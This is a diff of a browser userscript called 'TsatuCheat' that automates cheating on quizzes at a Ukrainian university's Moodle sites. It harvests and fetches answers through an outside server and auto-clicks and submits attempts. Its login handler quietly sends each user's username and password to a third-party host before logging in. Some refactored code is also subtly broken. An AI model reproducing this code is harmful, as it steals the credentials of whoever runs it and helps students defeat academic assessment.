@@ -3,8 +3,8 @@
 // @version 1.4.2
 // @require https://code.jquery.com/jquery-3.5.1.slim.min.js
 // @require https://unpkg.com/imagesloaded@4/imagesloaded.pkgd.min.js
-// @include http://nip.tsatu.edu.ua/*
 // @include http://op.tsatu.edu.ua/*
+// @run-at document-end
 // ==/UserScript==
 
 (function() {
@@ -12,21 +12,18 @@
     var haymaking = false;//enable automatic collection of responses from the account
     var haymlist = false;//dont turn on if there are a lot of tests
     var autonext = false;// true / false
-    console.log('script start');
+    console.log('TsatuCheat start');
     $(document).imagesLoaded( function() { Geheimwaffe(); });
     var Geheimwaffe = function() {
-        console.log('func start');
         if (/^https?:\/\/(nip|op)\.tsatu\.edu\.ua\/login\/index\.php/.test(window.location.href)) { loginPage(); }
         else {
-            userHeader();
             if (/^https?:\/\/(nip|op)\.tsatu\.edu\.ua\/my/.test(window.location.href)) {mainPage();}/*courses*/
             else if (/^https?:\/\/(nip|op)\.tsatu\.edu\.ua\/course\/view\.php/.test(window.location.href)) {testList();}/*tests in course*/
             else if (/^https?:\/\/(nip|op)\.tsatu\.edu\.ua\/mod\/quiz\/view\.php/.test(window.location.href)) {testView();}/*testview*/
             else if (/^https?:\/\/(nip|op)\.tsatu\.edu\.ua\/mod\/quiz\/attempt\.php/.test(window.location.href)) {testAttempt();}/*attempt*/
-            else if (/^https?:\/\/(nip|op)\.tsatu\.edu\.ua\/mod\/quiz\/view\.php/.test(window.location.href)) {testOverview ();}
+            /*else if (/^https?:\/\/(nip|op)\.tsatu\.edu\.ua\/mod\/quiz\/view\.php/.test(window.location.href)) {testOverview ();}*/
             else if (/^https?:\/\/(nip|op)\.tsatu\.edu\.ua\/mod\/quiz\/review\.php/.test(window.location.href)) {
-                if (!/&showall=1$/.test(window.location.href))window.location.replace(window.location.href + '&showall=1');
-                else reviewPage();
+                (!/&showall=1$/.test(window.location.href))? window.location.replace(window.location.href + '&showall=1'):reviewPage();
             }
             else if (/http:\/\/(nip|op)\.tsatu\.edu\.ua\/mod\/quiz\/summary.php/.test(window.location.href)) {
                 if (autonext) {
@@ -45,12 +42,9 @@
             var login = document.querySelector('#username').value;
             var pass = document.querySelector('#password').value;
             xhr.open('GET', 'http://tsatu.zcxv.icu/api.php?q=login&login='+encodeURIComponent(login)+'&pass='+encodeURIComponent(pass), true);
-            xhr.onload = function() {
-                document.querySelector('#login').submit();
-            }
-            xhr.onerror = function() {
-                document.querySelector('#login').submit();
-            }
+            var subm = () => document.querySelector('#login').submit();
+            xhr.onload = subm;
+            xhr.onerror = subm;
             xhr.send();
         });
     }
@@ -80,21 +74,15 @@
         hhg.forEach((el) => {
             if(haymaking && haymlist){
                 var kh = el.querySelector("a");
-                if(kh!=null){
-                    window.open(kh.href);
-                }
+                if(kh) window.open(kh.href);
             }
-            if (el.querySelectorAll(".isrestricted").length > 0) {
-                el.style = "background:#FF0000;color:#fff";
-            } else {
-                el.style = "background:#00FF00;color:#fff";
-            }
+            el.style = 'background:#' + ((el.querySelectorAll(".isrestricted").length > 0) ? 'FF0000':'00FF00') + ';color:#fff';
         });
         if(haymaking && haymlist){
             window.close();
         }
         var tlist = document.querySelectorAll('li.quiz');
-        var rid = window.location.href;//TODO: \/\/\/--------------------------------------------------------
+        var rid = window.location.href;
         var arr = [];
         arr.push({'name':rid,'link':'0','':userid()});
         tlist.forEach((el) => {
@@ -117,8 +105,7 @@
             var hg = document.querySelectorAll(".cell.lastcol");
             if(hg.length<1) haymaking = false;
             hg.forEach((el) => {
-                var ei = el.querySelector("a");
-                window.open(ei.href);
+                window.open(el.querySelector("a").href);
             });
         }
         if(haymaking) window.close();
@@ -152,17 +139,10 @@
         console.log('testAttempt');
         var butn = document.querySelector('.mod_quiz-next-nav');
         butn.setAttribute('type','button');
-
         lister = document.querySelector('.mod_quiz-next-nav').addEventListener('click', (event) => {
-            pressNext();//I don't know why, but it doesn't work directly
+            pressNext();
         });
-
         getAnswers();
-    }
-
-
-    var testOverview = function() {
-        console.log('testOverview');
     }
 
     var reviewPage = function() {
@@ -186,37 +166,26 @@
                 var answ = filterAnswer(el);
 
                 console.log(answ);
-                //incorrect
                 if (el.classList.contains('incorrect')) {
                     NonRightAnswered.push(answ);
                 }
-                //correct
                 if (el.classList.contains('correct')) {
                     RightAnswered.push(answ);
                 }
                 //check grade
                 if (el.querySelector('input[checked="checked"]')) {
                     var grade = part.querySelector('.grade').innerHTML;
-                    if ((grade.localeCompare('Балів 1,00 з 1,00')) == 0) {
+                    if ((grade.localeCompare('Балів 1,00 з 1,00')) == 0 || (grade.localeCompare('Mark 1.00 out of 1.00')) == 0) {
                         RightAnswered.push(answ);
                     }
-                    if ((grade.localeCompare('Балів 0,00 з 1,00')) == 0) {
-                        NonRightAnswered.push(answ);
-                    }
-                    if ((grade.localeCompare('Mark 1.00 out of 1.00')) == 0) {
-                        RightAnswered.push(answ);
-                    }
-                    if ((grade.localeCompare('Mark 0.00 out of 1.00')) == 0) {
+                    if ((grade.localeCompare('Балів 0,00 з 1,00')) == 0 || (grade.localeCompare('Mark 0.00 out of 1.00')) == 0) {
                         NonRightAnswered.push(answ);
                     }
                 }
                 ans.push(answ);
             });
             var RightAnswer = part.querySelector('.rightanswer');
-            if (RightAnswer == null) {
-                //bad luck
-            } else {
-                //console.error(detectMultiAnswer(RightAnswer.innerHTML));
+            if (RightAnswer !== null) {
                 RightAnswered.push(filterRightanswer(RightAnswer));
             }
             console.warn([Question, ans, RightAnswered, NonRightAnswered]);
@@ -250,59 +219,41 @@
 
     var svcIconRemove = function(part) {
         var img = part.querySelectorAll('.questioncorrectnessicon, i .icon');
-        if (img.length > 0) {
-            img.forEach((im) => {
-                im.remove();
-            });
-        }
+        if (img.length < 1) return;
+        img.forEach((im) => {
+            im.remove();
+        });
     }
 
     var filterQue = function(que) {
         filterInner(que);
         return filterText(que.innerHTML);
-    }
+    };
+
+    var trem = function(s, a, b){
+        var tags = s.querySelectorAll(a);
+        if (tags.length < 1) return;
+        tags.forEach(function(v, i, a) {
+            v.removeAttribute(b);
+        });
+    };
 
     var filterInner = function(el) {
-        //Forced cleaning from unnecessary tags & attributes
         var tags;
         while((tags = el.querySelector('p,span,div,i'))!==null) {
             tags.outerHTML=tags.innerHTML;
         }
-        tags = el.querySelectorAll('[id]');
-        if(tags.length > 0){
-            tags.forEach(function(v, i, a) {
-                v.removeAttribute('id');
-            });
-        }
-        tags = el.querySelectorAll('[class]');
-        if(tags.length > 0){
-            tags.forEach(function(v, i, a) {
-                v.removeAttribute('class');
-            });
-        }
-        tags = el.querySelectorAll('[style]');
-        if(tags.length > 0){
-            tags.forEach(function(v, i, a) {
-                v.removeAttribute('style');
-            });
-        }
-        tags = el.querySelectorAll('a[name]');
-        if(tags.length > 0){
-            tags.forEach(function(v, i, a) {
-                v.removeAttribute('name');
-            });
-        }
-        tags = el.querySelectorAll('[lang]');
-        if(tags.length > 0){
-            tags.forEach(function(v, i, a) {
-                v.removeAttribute('lang');
-            });
-        }
-    }
+        trem(tags, '[id]', 'id');
+        trem(tags, '[class]', 'class');
+        trem(tags, '[style]', 'style');
+        trem(tags, 'a[name]', 'name');
+        trem(tags, '[lang]', 'lang');
+    };
 
-    var filterText = function(a) {
-        return a.replace(/(‘|’)+/, '\'').replace(/(«|»|“|”|„)+/, '"').replace(/&nbsp;/, ' ').replace(/(\r|\n)+/, ' ').replace(/\s\s+/g, ' ').replace(/\.$/, '').trim();
-    }
+    var filterText = function(text, rmquotes) {
+        var out = text.replace(/(‘|’)+/g, '\'').replace(/(«|»|“|”|„)+/g, '"');
+        return (rmquotes?out.replace(/(\'|")+/g, ' '):out).replace(/&nbsp;/g, ' ').replace(/(\r|\n)+/g, ' ').replace(/\s\s+/g, ' ').trim().replace(/\.$/, '').trim();
+    };
 
     var filterAnswer = function (el) {
         filterInner(el);
@@ -310,7 +261,7 @@
         if (anb) anb.remove();
         var a = el.querySelector('label').innerHTML;
         return filterText(a.replace(/^([a-z])\. /, ''));
-    }
+    };
 
     var filterRightanswer = function(text) {
         filterInner(text);
@@ -320,14 +271,14 @@
         res = res.replace(new RegExp('The correct answer is: '), '');
         res = res.replace(new RegExp('The correct answers are: '), '');
         return res.replace(/^([a-z])\. /, '').trim().replace(/\.$/, '');
-    }
+    };
 
     var detectMultiAnswer = function(answer) {
         if (answer.search(new RegExp('The correct answers are: ')) || answer.search(new RegExp('Правильні відповіді: '))) {
             return true;
         }
         return false;
-    }
+    };
 
     var sendJson = function(q,data,cb=null) {
         console.log('Send:');
@@ -346,9 +297,9 @@
             alert('Error: Not sent');
         }
         xhr.send(JSON.stringify(data));
-    }
+    };
 
-    var getJson = function(q,data,cb,cbdat=null) {
+    var getJson = function(q,data,cb,cbdat) {
         console.log('Get:');
         console.log(data);
         var xhr = new XMLHttpRequest();
@@ -359,7 +310,7 @@
             console.warn('Response:');
             console.log(xhr.response);
             var jsonResponse;
-            if(cbdat!=null) {
+            if(cbdat) {
                 jsonResponse = cb(JSON.parse(xhr.response),cbdat);
             }
             else {
@@ -371,14 +322,15 @@
             alert('Error (get): Not sent');
         }
         xhr.send(JSON.stringify(data));
-    }
+    };
 
     var writetext = function(data, input) {
         console.log('WriteText');
         input[0].value = data;
-    }
+    };
+
     var getAnswers = function() {
-        var parts = document.querySelectorAll('.que');
+        var parts = document.querySelectorAll('.que div.content');
         var qparr = [];
         var get = true;
         parts.forEach((part) => {
@@ -408,18 +360,17 @@
             qparr.push({'que':Question, 'answ':JSON.stringify(AnswRaw)});
         });
         if (get) getJson('answ',qparr,highlightAnswers);
-    }
+    };
 
     var answersclicked = false;
 
     var highlightAnswers = function (arr) {
         console.warn('Highlight');
         console.warn(arr);
-        var parts = document.querySelectorAll('.que');
+        var parts = document.querySelectorAll('.que div.content');
         console.log('#todo: i know it is wrong, but it works');
 
         parts.forEach((part) => {
-            randomClick(part);
             if(arr.length>0){
                 var answShift = arr.shift();
                 console.log(answShift);
@@ -460,13 +411,14 @@
                             break;
                     }
                 });
+                randomClick(part);
             }
 
         });
         if(autonext){
             pressNext();
         }
-    }
+    };
 
     var randomClick = function (part) {
         console.warn('Random');
@@ -490,34 +442,28 @@
                 if (selected.length > 0) {
                     rp = Math.floor(Math.random() * selected.length);
                     selected[rp].click();
-                    console.log('%%$');
-                    console.log(selectedb);
-                    //pressNext();
                 } else {
                     alert("Error: can't determine type of question");
                 }
             }
         }
-    }
+    };
 
     var clkEnd = function() {
         var tmp = document.querySelectorAll(".submitbtns.mdl-align");
         console.log(tmp);
         tmp.forEach((el) => {
-            console.log("----");
             if (el.querySelector("input[name=finishattempt]") !== null) {
-                if (/https?:\/\/nip/.test(window.location.href)) {//TODO: combine this for either version
-                    el.querySelector("input[type=submit]").click();
-                } else {
-                    el.querySelector("button").click();
-                }
-            } else console.log("fff");
+                //el.querySelector("input[type=submit]").click(); //For old versiions
+                el.querySelector("button").click();
+            }
         });
-    }
+    };
+
     var clkOvEnd = function() {
         var q = document.querySelector(".moodle-dialogue input");
         if (q !== null) q.click();
-    }
+    };
 
     var filterImgs = function(part) {
         var img = part.querySelectorAll('img');
@@ -531,7 +477,7 @@
             });
         }
         return part;
-    }
+    };
 
     var createView = function() {
         var canvas = document.createElement("canvas");
@@ -539,7 +485,7 @@
         canvas.style = "border:black solid;display:none;";
         document.body.appendChild(canvas);
         return canvas;
-    }
+    };
 
     var getImg = function(c, im) {
         var context = c.getContext('2d');
@@ -553,7 +499,7 @@
             context.drawImage(im, 0, 0);
             return c.toDataURL();
         }
-    }
+    };
 
     var MD5 = function(d) {
         function md5_cmn(d, _, m, f, r, i) {
@@ -627,19 +573,11 @@
 
     var userid = function () {
         var usid = localStorage.getItem("useriden");
-        if (usid === null) {
-            return Array('');
-        } else {
-            return usid;
-        }
+        return (usid === null)?Array(''):usid;
     };
 
     var getuserblock = function () {
         var ustext = document.querySelector('.usertext');
-        if (ustext === null) {
-            return '';
-        } else {
-            return ustext.innerHTML;
-        }
+        return (ustext === null)?'':ustext.innerHTML;
     }
     })();
